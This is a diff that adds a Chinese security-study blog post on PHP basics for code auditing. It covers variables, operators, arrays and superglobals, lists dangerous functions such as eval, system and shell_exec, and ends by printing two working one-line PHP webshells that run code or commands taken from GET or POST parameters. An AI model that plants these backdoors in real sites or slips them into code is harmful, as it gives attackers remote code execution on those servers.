@@ -1,0 +1,697 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+    
+
+    <title>6、PHP | 2h0nG&#39;s Hacker Blog</title>
+    <meta name="author" content="John Doe">
+    
+    <meta name="description" content="Love is friendship fell into love">
+    
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <meta property="og:title" content="6、PHP"/>
+    <meta property="og:site_name" content="2h0nG&#39;s Blog"/>
+
+    
+    <meta property="og:image" content=""/>
+    
+
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <link rel="alternate" href="/atom.xml" title="2h0nG&#39;s Blog" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/lib/materialize.min.css">
+    <link rel="stylesheet" href="/css/lib/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+
+    
+        <link rel="stylesheet" href="/css/lib/prettify-tomorrow-night-eighties.css" type="text/css">
+    
+    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+<meta name="generator" content="Hexo 5.0.0"></head>
+
+
+<body>
+    <img src="/weixin_favicon.png" style="position: absolute; left: -9999px; opacity: 0; filter: alpha(opacity=0);">
+
+    <nav class="indigo">
+    <div class="nav-wrapper">
+        <a href="#" data-activates="main-menu" class="button-collapse">
+            <i class="fa fa-navicon"></i>
+        </a>
+        <div class="">
+            <a href="/" class="brand-logo hide-on-med-and-down">2h0nG&#39;s Blog</a>
+            <ul class="right hide-on-med-and-down">
+                
+                    <li>
+                        <a class="menu-home " href="/" >
+                            <i class="fa fa-home "></i>
+                            
+                            首页
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-archive " href="/archives" >
+                            <i class="fa fa-archive "></i>
+                            
+                            归档
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                            <i class="fa fa-bookmark "></i>
+                            
+                            分类
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-reading " href="/reading" >
+                            <i class="fa fa-book "></i>
+                            
+                            读书
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-about " href="/about" >
+                            <i class="fa fa-user "></i>
+                            
+                            关于
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-search modal-trigger " href="#search" >
+                            <i class="fa fa-search "></i>
+                            
+                            搜索
+                        </a>
+                    </li>
+                
+            </ul>
+            <div>
+    <ul class="side-nav indigo darken-1" id="main-menu">
+        
+        <li class="side-user">
+            <div class="row">
+                <div class="col s4 no-padding">
+                    <img class="avatar-image circle responsive-img" src="http://ww2.sinaimg.cn/small/74990035jw1f1rjkd681bj20rs0rsdhg.jpg" alt="User Avatar">
+                </div>
+                <div class="info col s8 valign-wrapper no-padding">
+                    <div class="valign">
+                        <p class="name">2h0nG</p>
+                        <p class="desc">不断学习中/人品极佳/不太好接近</p>
+                    </div>
+                </div>
+            </div>
+        </li>
+        
+
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-home " href="/" >
+                    <i class="fa fa-home "></i>
+                    
+                    首页
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-archive " href="/archives" >
+                    <i class="fa fa-archive "></i>
+                    
+                    归档
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                    <i class="fa fa-bookmark "></i>
+                    
+                    分类
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-reading " href="/reading" >
+                    <i class="fa fa-book "></i>
+                    
+                    读书
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-about " href="/about" >
+                    <i class="fa fa-user "></i>
+                    
+                    关于
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-search modal-trigger " href="#search" >
+                    <i class="fa fa-search "></i>
+                    
+                    搜索
+                </a>
+            </li>
+        
+    </ul>
+
+    <ul class="side-nav indigo darken-1" id="category-menu">
+    
+
+            
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/Linux系统安全/">
+                    Linux系统安全 <span class="right">12 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/代码审计安全/">
+                    代码审计安全 <span class="right">8 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/Leetcode题解/">
+                    Leetcode题解 <span class="right">1 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/数据通信安全/">
+                    数据通信安全 <span class="right">3 篇</span></a>
+                </a>
+            </li>
+
+        
+
+    </ul>
+</div>
+
+        </div>
+    </div>
+</nav>
+
+<div id="search" class="modal search-modal">
+    <div class="row">
+        <div class="input-field col s12">
+              <input id="search-input" type="text">
+              <label for="search-input">搜索</label>
+        </div>
+
+    </div>
+    <div id="search-result" class="search-result col s12">
+
+    </div>
+</div>
+
+
+    <main>
+        <div class="container main-container">
+    <nav class="page-nav hide-on-small-only">
+    <div class="nav-wrapper indigo">
+        <span class="breadcrumb">当前位置（分类目录）</span>
+        
+            
+    
+    
+    <a class="breadcrumb" href="/categories/代码审计安全/">代码审计安全</a>
+
+
+        
+
+        
+    </div>
+</nav>
+
+<article>
+    <div class="card">
+        <div class="card-content">
+            
+
+            <div class="article-title">
+                
+    
+        <h1>6、PHP</h1>
+    
+
+
+            </div>
+            <time class="pink-link-context" datetime="2020-07-30T01:16:06.000Z"><a href="/2020/07/30/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/6%E3%80%81PHP/">2020-07-30</a></time>
+
+            <span id="busuanzi_container_page_pv" class="read-times-container">
+    <i class="fa fa-eye"></i>
+    <span id="busuanzi_value_page_pv"></span>
+</span>
+
+            
+    <div class="tags-row">
+        
+            <a href="/tags/代码审计安全/" class="chip pink lighten-1">代码审计安全</a>
+        
+    </div>
+
+
+            <div class="toc pink-link-context hide-on-med-and-down">
+    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#PHP"><span class="section table-of-contents-text">PHP</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B8%80%E3%80%81PHP%E7%89%B9%E7%82%B9"><span class="section table-of-contents-text">一、PHP特点</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E3%80%81PHP%E5%9F%BA%E7%A1%80"><span class="section table-of-contents-text">二、PHP基础</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#1%E3%80%81PHP%E6%A0%87%E7%AD%BE%EF%BC%9A"><span class="section table-of-contents-text">1、PHP标签：</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#2%E3%80%81PHP%E5%8F%98%E9%87%8F"><span class="section table-of-contents-text">2、PHP变量</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#3%E3%80%81PHP%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="section table-of-contents-text">3、PHP运算符</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B8%89%E3%80%81%E5%B8%B8%E8%A7%81%E7%9A%84PHP%E8%AF%AD%E5%8F%A5"><span class="section table-of-contents-text">三、常见的PHP语句</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%9B%9B%E3%80%81PHP%E7%9A%84%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6"><span class="section table-of-contents-text">四、PHP的流程控制</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%94%E3%80%81PHP%E5%87%BD%E6%95%B0"><span class="section table-of-contents-text">五、PHP函数</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%85%AD%E3%80%81PHP%E6%95%B0%E7%BB%84"><span class="section table-of-contents-text">六、PHP数组</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B8%83%E3%80%81PHP%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="section table-of-contents-text">七、PHP危险函数</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%85%AB%E3%80%81%E9%AA%8C%E8%AF%81%E7%99%BB%E5%BD%95%E8%A1%A8%E5%8D%95-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AE%9E%E4%BE%8B"><span class="section table-of-contents-text">八、验证登录表单&#x2F;文件上传实例</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B9%9D%E3%80%81%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%90%8E%E9%97%A8"><span class="section table-of-contents-text">九、一句话后门</span></a></li></ol></li></ol>
+</div>
+
+
+            <div class="entry pink-link-context">
+                <h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="一、PHP特点"><a href="#一、PHP特点" class="headerlink" title="一、PHP特点"></a>一、PHP特点</h3><p>1、可以与HTML混编，但脚本后缀名应为.php。</p>
+<p>2、PHP注释不会在页面文档的源码中显示，而HTML页面的注释和JS的注释却可以在页面源码中显示。这是因为PHP的运行环境是服务器端，我们浏览器端获得的最终的页面内容是服务器端PHP的解释器对PHP代码处理完成后产生的结果。而HTML和JS的运行环境就是浏览器。这就是根本的区别。</p>
+<p>3、PHP的语法错误等级有error、warning、notice，其中有语句出现error级别的错误直接会停止接下来的语句解释运行，而warning和notice只提示错误，仍然会继续解释执行接下来的语句。</p>
+<h3 id="二、PHP基础"><a href="#二、PHP基础" class="headerlink" title="二、PHP基础"></a>二、PHP基础</h3><h4 id="1、PHP标签："><a href="#1、PHP标签：" class="headerlink" title="1、PHP标签："></a>1、PHP标签：</h4><p><code>&lt;?php 左边开始标记，右边结束标记 ?&gt;</code></p>
+<h4 id="2、PHP变量"><a href="#2、PHP变量" class="headerlink" title="2、PHP变量"></a>2、PHP变量</h4><p><u>1）变量的声明</u>：<code>$变量名</code>第一次给变量赋值时才创建这个变量（像shell）</p>
+<p><u>2）变量的释放</u>：<code>unset $变量名;</code> </p>
+<p><u>3）变量命名规则</u>：严格区分大小写、字母数字下划线，不能以数字开头。</p>
+<p><u>4）可变变量</u>：<code>$$变量名</code>，此变量的变量名跟随<code>$变量名</code>变化。</p>
+<p><u>5）引用赋值</u>：<code>$b=&amp;$a</code>，使<code>$b</code>变量指向<code>$a</code>的内存空间，此时<code>$a</code>和<code>$b</code>指向了同一块内存空间。</p>
+<p><u>6）变量的数据类型</u>：</p>
+<blockquote>
+<p>1、布尔类型bool(true、false)：false、0、0.0、””、”0”、[]、NULL这些值会被作为条件的false。</p>
+<p>2、整型int；3、浮点数float；</p>
+<p>4、字符串string：单引号、双引号定义都可，区别在于①字符串内容对单引号和双引号以及是否转义的使用②双引号定义的字符串中包含变量名时可以取变量值（最好把变量用{}括起来），单引号只可表面输出变量名。</p>
+<p>​    比较特别的一种string定义方式——定界符定义：使用定界符定义一个字符串时，字符串的内容可以随意使用特殊符号，无需担心转移符号所带来的繁杂困扰</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$str = &lt;&lt;&lt;大写字母开头的符号标识 </span><br><span class="line">......................</span><br><span class="line">大写字母开头的符号标识;</span><br><span class="line"><span class="comment">//注意定界符的格式特别严谨，结束符的行只能由符号标识和一个分号，其它什么元素都不能有</span></span><br></pre></td></tr></table></figure>
+
+<p>5、数组；6、对象；</p>
+<p>7、常量：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">常量的定义：define(<span class="string">&quot;常量名&quot;</span>,<span class="string">&quot;常量内容&quot;</span>);全局/整个脚本文件有效。</span><br><span class="line">预定义的常量：</span><br><span class="line"><span class="keyword">__FILE__</span>    当前文件的绝对路径/文件名</span><br><span class="line"><span class="keyword">__LINE__</span>    当前代码行数</span><br><span class="line"><span class="keyword">__FUNCTION__</span>    当前函数名</span><br><span class="line"><span class="keyword">__CLASS__</span>    当前的类名</span><br><span class="line"><span class="keyword">__METHOD__</span>    当前对象的方法名</span><br><span class="line"><span class="keyword">__DIR__</span>        当前工作目录</span><br><span class="line">PHP_OS    解释PHP脚本的操作系统环境</span><br><span class="line">PHP_VERSION    PHP版本</span><br><span class="line">DIRECTORY_SEPARATOR    操作系统文件分隔符 win\ linux/</span><br></pre></td></tr></table></figure>
+
+</blockquote>
+<p><u>7）变量的作用域</u>：</p>
+<blockquote>
+<p>三种类型变量：Local（局部 函数内定义）、Global（全局 函数外定义）、Static（静态 关键字定义）</p>
+<p>当需要函数内使用全局变量时需要使用<code>global</code>关键字声明，也可使用<code>$GLOBALS[&#39;变量名&#39;]</code>访问。</p>
+</blockquote>
+<h4 id="3、PHP运算符"><a href="#3、PHP运算符" class="headerlink" title="3、PHP运算符"></a>3、PHP运算符</h4><p><u>1）算术运算符</u>：<code>a .= b/ a = a . b    #字符串的连接</code></p>
+<p><u>2）比较运算符</u>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注意在php中 6 == &quot;6&quot; 为true，“==”不在乎类型只在乎内容，&quot;===&quot;在乎类型。</span></span><br><span class="line">x === y <span class="comment">#绝对等于，内容和类型都相同</span></span><br><span class="line">x !== y    <span class="comment">#绝对不等于，内容或类型不同为true</span></span><br><span class="line">x != y / x &lt;&gt; y    <span class="comment">#不等于</span></span><br></pre></td></tr></table></figure>
+
+<p><u>3）逻辑运算符</u>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span>、<span class="keyword">or</span>、&amp;&amp;、||、!、<span class="keyword">xor</span>(异或)    <span class="comment">#逻辑运算符运算的值是true和false</span></span><br><span class="line"><span class="comment">## and 、 xor 、 or 的优先级小于“ = ”！</span></span><br></pre></td></tr></table></figure>
+
+<p><u>4）数组运算符</u>：</p>
+<table>
+<thead>
+<tr>
+<th align="left">运算符</th>
+<th align="left">名称</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">x + y</td>
+<td align="left">集合</td>
+<td align="left">x 和 y 的集合</td>
+</tr>
+<tr>
+<td align="left">x == y</td>
+<td align="left">相等</td>
+<td align="left">如果 x 和 y 具有相同的键/值对，则返回 true</td>
+</tr>
+<tr>
+<td align="left">x === y</td>
+<td align="left">恒等</td>
+<td align="left">如果 x 和 y 具有相同的键/值对，且顺序相同类型相同，则返回 true</td>
+</tr>
+<tr>
+<td align="left">x != y</td>
+<td align="left">不相等</td>
+<td align="left">如果 x 不等于 y，则返回 true</td>
+</tr>
+<tr>
+<td align="left">x &lt;&gt; y</td>
+<td align="left">不相等</td>
+<td align="left">如果 x 不等于 y，则返回 true</td>
+</tr>
+<tr>
+<td align="left">x !== y</td>
+<td align="left">不恒等</td>
+<td align="left">如果 x 不等于 y，则返回 true</td>
+</tr>
+</tbody></table>
+<p><u>5）组合比较符</u>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$c = $a &lt;=&gt; $b;</span><br><span class="line">如果 $a &gt; $b, 则 $c 的值为 <span class="number">1</span>。</span><br><span class="line">如果 $a == $b, 则 $c 的值为 <span class="number">0</span>。</span><br><span class="line">如果 $a &lt; $b, 则 $c 的值为 <span class="number">-1</span>。</span><br></pre></td></tr></table></figure>
+
+<p><u>6）shell命令执行符</u>：两个反引号`，页面返回执行结果</p>
+<p><u>7）屏蔽warn、notice符</u>：<code>@</code>，在变量前加</p>
+<h3 id="三、常见的PHP语句"><a href="#三、常见的PHP语句" class="headerlink" title="三、常见的PHP语句"></a>三、常见的PHP语句</h3><p>1、<code>phpinfo()</code></p>
+<p>2、<code>echo</code>    #输出</p>
+<p>3、<code>var_dump()</code>    #输出变量值以及变量内容</p>
+<h3 id="四、PHP的流程控制"><a href="#四、PHP的流程控制" class="headerlink" title="四、PHP的流程控制"></a>四、PHP的流程控制</h3><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.control-structures.php">https://www.php.net/manual/zh/language.control-structures.php</a></p>
+<p>if、switch、while、do while、for和C语言相同; </p>
+<p><u>特殊</u>：</p>
+<p>1、<code>break n</code>跳出n层循环，比如for嵌套三个，在内层可以break 3，直接跳出结束3层循环。</p>
+<p>2、<code>die()</code>、<code>exit()</code>结束脚本执行/PHP解释器进程。</p>
+<h3 id="五、PHP函数"><a href="#五、PHP函数" class="headerlink" title="五、PHP函数"></a>五、PHP函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#参数传递方式：</span></span><br><span class="line"><span class="comment">#1、值传递；2、引用传递&amp;；</span></span><br><span class="line"><span class="comment">#3、默认参数值：$参数名=默认值；</span></span><br><span class="line"><span class="comment">#4、可变参数列表：func_get_arg(偏移量)、func_get_args()、func_num_args()获取参数个数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> 函数名(<span class="params">$参数名</span>)    </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">return</span> $返回值变量;    <span class="comment">#如需返回值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">######## 可变函数调用 ########</span></span><br><span class="line">$variable = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">$variable(<span class="string">&quot;ipconfig&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="六、PHP数组"><a href="#六、PHP数组" class="headerlink" title="六、PHP数组"></a>六、PHP数组</h3><p>PHP的数组是一种可承载复合类型的数组，<u>可理解为一种随意的map。键值对类型随意，潇洒。</u></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//以下是菜鸟教程讲解，个人认为PHP的数组就是随意的Map，无数组类型之分。</span></span><br><span class="line"><span class="comment">###数值数组</span></span><br><span class="line">$数组名=<span class="keyword">array</span>(<span class="string">&quot;值&quot;</span>,<span class="string">&quot;值&quot;</span>);    <span class="comment">#创建数组方法1</span></span><br><span class="line">$数组名[n]=<span class="string">&quot;值&quot;</span>;    <span class="comment">#创建数组方法2</span></span><br><span class="line">$数组名[]=<span class="string">&quot;值&quot;</span>;    <span class="comment">#创建数组方法3，索引值自动设置为最小数字</span></span><br><span class="line">count($数组名);    <span class="comment">#获得数组长度</span></span><br><span class="line">print_r($数组名)、var_dump($数组名);    <span class="comment">#输出数组</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###关联数组（Map）</span></span><br><span class="line">$数组名=<span class="keyword">array</span>(<span class="string">&quot;键&quot;</span>=&gt;<span class="string">&quot;值&quot;</span>,<span class="string">&quot;键&quot;</span>=&gt;<span class="string">&quot;值&quot;</span>);    <span class="comment">#创建关联数组方法1</span></span><br><span class="line"><span class="keyword">foreach</span>($数组名 <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;key:&quot;</span>.$key.<span class="string">&quot; value:&quot;</span>.$value.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">###多维数组</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###超全局预定义数组变量(函数内外都可以使用，无需声明)</span></span><br><span class="line">$GLOBALS    <span class="comment">#全局变量数组</span></span><br><span class="line">$_SERVER    <span class="comment">#包含服务器相关信息的数组</span></span><br><span class="line">$_GET        <span class="comment">#通过URL参数/GET方法传递给当前脚本的变量数组:url?arg1=v&amp;arg2=v</span></span><br><span class="line">$_POST        <span class="comment">#当HTTP POST请求报文中的属性Content-Type是application/x-www-form-urlencoded 或 multipart/form-data时，会将变量以关联数组形式传入脚本</span></span><br><span class="line">$_FILES        <span class="comment">#文件上传信息的关联数组</span></span><br><span class="line">$_COOKIE    <span class="comment">#客户端传送的Cookie信息</span></span><br><span class="line">$_SESSION    <span class="comment">#客户端的会话数据</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="七、PHP危险函数"><a href="#七、PHP危险函数" class="headerlink" title="七、PHP危险函数"></a>七、PHP危险函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>($POST[<span class="string">&#x27;1&#x27;</span>])    <span class="comment">#将字符串作为PHP代码执行</span></span><br><span class="line">assert($字符串变量)    <span class="comment">#将字符串作为PHP代码执行</span></span><br><span class="line">$h = create_function(<span class="string">&#x27;$i&#x27;</span>, <span class="string">&#x27;return system($i);&#x27;</span>);    $h(<span class="string">&#x27;ipconfig&#x27;</span>);<span class="comment">#匿名函数</span></span><br><span class="line"><span class="keyword">echo</span> shell_exec(<span class="string">&#x27;shell命令&#x27;</span>)</span><br><span class="line">system(<span class="string">&#x27;shell命令&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="八、验证登录表单-文件上传实例"><a href="#八、验证登录表单-文件上传实例" class="headerlink" title="八、验证登录表单/文件上传实例"></a>八、验证登录表单/文件上传实例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">isset</span>($变量名)    <span class="comment">#验证变量是否被定义过</span></span><br><span class="line"><span class="keyword">empty</span>($变量名)    <span class="comment">#判断变量内容是否为空，即使变量未被定义</span></span><br><span class="line">move_uploaded_file(被移动文件,路径/目标文件);    <span class="comment">#返回true/false，复制上传的文件的某个位置</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="九、一句话后门"><a href="#九、一句话后门" class="headerlink" title="九、一句话后门"></a>九、一句话后门</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $_GET[<span class="string">&#x27;a&#x27;</span>]($_GET[<span class="string">&#x27;b&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+                
+<p class="pink-link-context">
+    <a href="/2020/07/31/Leetcode%E9%A2%98%E8%A7%A3/61%E3%80%81%E6%97%8B%E8%BD%AC%E9%93%BE%E8%A1%A8/" rel="next" title="61-旋转链表">
+    上一篇：61-旋转链表
+  </a>
+</p>
+
+
+
+<p class="pink-link-context">
+    <a href="/2020/07/29/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/5%E3%80%81Javascript/" rel="next" title="5、Javascript">
+    下一篇：5、Javascript
+  </a>
+</p>
+
+
+            </div>
+			
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+</div>
+
+        <div class="fixed-action-btn float-sitemap">
+    <a class="btn-floating btn-large pink">
+      <i class="fa fa-caret-square-o-up"></i>
+    </a>
+    <ul>
+      <li><a class="btn-return-top btn-floating waves-effect green" title="回到顶部"><i class="fa fa-arrow-circle-o-up"></i></a></li>
+      <li><a class="btn-floating waves-effect button-collapse yellow darken-1"  data-activates="main-menu" title="菜单"><i class="fa fa-navicon"></i></a></li>
+    </ul>
+  </div>
+
+    </main>
+    <footer class="page-footer indigo darken-1">
+    
+    <div class="footer-container container">
+        <div class="row">
+            
+            <div class="social-group col m4 s12">
+                <h5 class="white-text">社交</h5>
+                
+                    <a class="social-link" href="http://weibo.com/1956184117" target="_blank">
+                        <i class="fa fa-2x fa-weibo"></i>
+                    </a>
+                
+                    <a class="social-link" href="https://github.com/raytaylorlin" target="_blank">
+                        <i class="fa fa-2x fa-github"></i>
+                    </a>
+                
+                    <a class="social-link" href="/atom.xml" target="_blank">
+                        <i class="fa fa-2x fa-rss"></i>
+                    </a>
+                
+                
+
+            </div>
+            
+
+            
+            <div class="col m8 s12">
+                <h5 class="white-text">友情链接</h5>
+                
+                    <a class="social-link" href="http://raytaylorlin.com/" target="_blank">raytaylorism主题作者的技术博客</a>
+                
+                    <a class="social-link" href="https://github.com/raytaylorlin" target="_blank">Github地址（测试友情链接）</a>
+                
+            </div>
+            
+        </div>
+    </div>
+    
+
+    <div class="footer-copyright pink-link-context">
+        <div class="container">
+            © 2016 example.com, All rights reserved.
+            <p class="right" style="margin-top: 0;">本博客由 <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> 强力驱动 | 主题 <a target="_blank" rel="noopener" href="https://github.com/raytaylorlin/hexo-theme-raytaylorism">raytaylorism</a></p>
+        </div>
+    </div>
+</footer>
+
+
+    <noscript>
+    <div class="noscript">
+        <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+    </div>
+</noscript>
+<div class="noscript">
+    <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+</div>
+
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/materialize.min.js"></script>
+
+<script>
+    (function($) {
+        $(document).ready(function() {
+            // 隐藏禁用javascript（针对微信内置浏览器）的提示
+            $('.noscript').hide();
+
+            // 图片缩放效果
+            var $imgs = $('img').not('.slider-image').not('.avatar-image').not('.carousel-image').not('.card-cover-image').not('.qrcode');
+
+            // 给图片加上点击放大效果（materialbox插件）
+            $imgs.addClass('materialboxed').each(function(i, el) {
+                $(this).attr('data-caption', $(this).attr('alt') || ' ');
+            }).materialbox();
+
+            // 优化表格的显示
+            $('table').each(function() {
+                var $table = $(this);
+                // 除去多行代码的情况
+                if ($table.find('pre').length == 0) {
+                    $table.addClass('responsive-table striped bordered');
+                }
+            });
+
+            // 首页幻灯片
+            $('.slider').slider({indicators: true, full_width: true, interval: 8000});
+
+            $(".button-collapse").sideNav();
+            $(".category-menu").sideNav();
+
+            // 针对gallery post
+            $('.carousel').carousel({full_width: true});
+            $('.carousel-control.prev').click(function() {
+                $('.carousel').carousel('prev');
+            });
+            $('.carousel-control.next').click(function() {
+                $('.carousel').carousel('next');
+            });
+
+            // 文章目录
+            $('article').not('.simple-article').find('h1').add('h2').add('h3').add('h4').add('h5').add('h6').scrollSpy();
+
+            // 目录随屏幕滚动（防止目录过长越过footer）
+            var $toc = $('.toc');
+            var scrollTargetTop = 0;
+            $(window).scroll(function() {
+                var $activeLink = $toc.find('a.active.section');
+                if ($(window).scrollTop() < 100) {
+                    scrollTargetTop = 0;
+                } else {
+                    if ($activeLink[0]) {
+                        scrollTargetTop = $activeLink.offset().top - $toc.offset().top;
+                    }
+                }
+                $toc.css('top', '-' + scrollTargetTop + 'px');
+            });
+
+            // 修正文章目录的left-border颜色
+            var color = $('.table-of-contents-text').css('color');
+            $('.table-of-contents-link').css('border-left-color', color);
+
+            // 针对移动端做的优化：FAB按钮点击一下收回
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                $('.fixed-action-btn').addClass('click-to-toggle');
+            }
+            // 回到顶部
+            $('.btn-return-top').click(function() {
+                $('body, html').animate({
+                    scrollTop: 0
+                }, 500);
+            });
+
+            // 重置读书页面的Tab标签页的颜色
+            $('li.tab a').hover(function() {
+                $(this).toggleClass('text-lighten-4');
+            });
+            $('.indicator').addClass('pink lighten-2');
+
+            
+            // 添加new标签
+            $('').append('<span class="new badge pink"></span>');
+            
+
+            // 搜索功能
+            $('.modal-trigger').leanModal({
